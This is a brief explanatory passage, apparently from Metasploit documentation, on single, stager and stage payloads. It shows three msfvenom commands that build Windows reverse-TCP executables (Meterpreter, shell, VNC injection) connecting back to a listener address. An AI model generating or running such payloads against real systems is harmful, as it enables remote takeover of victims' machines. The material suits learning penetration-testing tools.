# How Payloads Work
### Singles
### Stagers
### Stages
## Delivering stages
1. The IP address and port you want the payload to connect back to are embedded in the stager. As discussed above, all staged payloads are no more than a small stub that sets up communication and executes the next stage. When you create an executable using a staged payload, you're really just creating the stager. So the following commands would create functionally identical exe files:
```
    msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp
```

